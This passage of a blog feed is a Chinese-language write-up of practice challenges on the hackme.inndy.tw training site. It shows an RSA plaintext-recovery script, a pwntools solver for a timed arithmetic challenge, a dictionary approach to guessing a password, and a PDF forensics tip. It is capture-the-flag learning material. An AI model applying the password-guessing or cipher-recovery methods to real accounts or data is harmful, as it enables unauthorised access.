class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">a = m[a].as_long()</span><br><span class="line">b = m[b].as_long()</span><br><span class="line"></span><br><span class="line">gcd, s, t = gcdext(a, b)</span><br><span class="line">s = -s <span class="comment"># 此处 s &lt; 0</span></span><br><span class="line">p = invert(p, M)</span><br><span class="line">plain = pow(p, s, M) * pow(q, t, M) % M</span><br><span class="line">print(long_to_bytes(plain))</span><br></pre></td></tr></table></figure><h1 id="programming"><a class="headerlink" href="#programming"></a>Programming</h1><h2 id="fast"><a class="headerlink" href="#fast"></a>fast</h2><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7707</span><br></pre></td></tr></table></figure><p>How fast could you be?</p></blockquote><p>nc 上去后题目会给出 10000 个表达式让你求值, 并且限制了时间.</p><p>这道题要注意的点主要是:</p><ul><li>梯子, 没梯子光接收数据都能超时...(一开始还以为这是 feature, 意在让我边接收边计算)</li><li>运算要遵循 C 语言下32位有符号整数的运算规则</li></ul><p>这道题用 cython 很合适, 就拿 cython 来写了. (吹一波 ipython, 真的好用, <code>%load_ext cython</code> 后就能方便地写 cython 代码了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">%%cython </span><br><span class="line">import cython</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">@cython.cdivision(True)</span><br><span class="line">def _eval(int a, op, int b):</span><br><span class="line">    if op == b&apos;+&apos;:</span><br><span class="line">        return a + b</span><br><span class="line">    elif op == b&apos;-&apos;:</span><br><span class="line">        return a - b</span><br><span class="line">    elif op == b&apos;*&apos;:</span><br><span class="line">        return a * b</span><br><span class="line">    elif op == b&apos;/&apos;:</span><br><span class="line">        return a / b</span><br><span class="line"></span><br><span class="line">io = remote(&apos;hackme.inndy.tw&apos;, 7707)</span><br><span class="line">io.recvuntil(&apos;start the game.\n&apos;)</span><br><span class="line">io.sendline(&apos;Yes I know&apos;)</span><br><span class="line"></span><br><span class="line">exps = b&apos;&apos;</span><br><span class="line"></span><br><span class="line">while exps.count(b&apos;\n&apos;) != 10000:</span><br><span class="line">    exps += io.recv()</span><br><span class="line">exps = exps.strip().split(b&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">ans = &apos;&apos;</span><br><span class="line">for i in range(len(exps)):</span><br><span class="line">    exp = exps[i].split()</span><br><span class="line">    a, b = int(exp[0]), int(exp[2])</span><br><span class="line">    op = exp[1]</span><br><span class="line">    ans += f&apos;&#123;_eval(a, op, b)&#125;\n&apos;</span><br><span class="line">io.send(ans)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="lucky"><a class="headerlink" href="#lucky"></a>Lucky</h1><h2 id="you-guess"><a class="headerlink" href="#you-guess"></a>you-guess</h2><blockquote><p>Can you guess my password?</p></blockquote><p>观察到 <code>'%s really hates her ex.' % password</code> , 密码应该是个女性人名.<br>随便找个字典跑就行了<br><a href="http://antirez.com/misc/female-names.txt" target="_blank" rel="noopener">female-names</a></p><h1 id="forensic"><a class="headerlink" href="#forensic"></a>Forensic</h1><h2 id="easy-pdf"><a class="headerlink" href="#easy-pdf"></a>easy pdf</h2><blockquote><p>Find the flag from this PDF document</p></blockquote><p>转成 html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S poppler</span><br><span class="line">pdftohtml --help</span><br></pre></td></tr></table></figure><h2 id="this-is-a-pen"><a class="headerlink" href="#this-is-a-pen"></a>this is a pen</h2><blockquote><p>Find the flag from this pdf</p></blockquote><p>和上一题一样</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;听奥博大佬说对新手很友好, 来试试&lt;/p&gt;
&lt;p&gt;官方不建议直接给出 flag, 就不放 flag 了&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://www.aloxaf.com/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
      <category term="pwn" scheme="https://www.aloxaf.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
      <category term="web" scheme="https://www.aloxaf.com/tags/web/"/>
    
      <category term="crypto" scheme="https://www.aloxaf.com/tags/crypto/"/>
    
      <category term="reverse" scheme="https://www.aloxaf.com/tags/reverse/"/>
    
  </entry>
  
</feed>
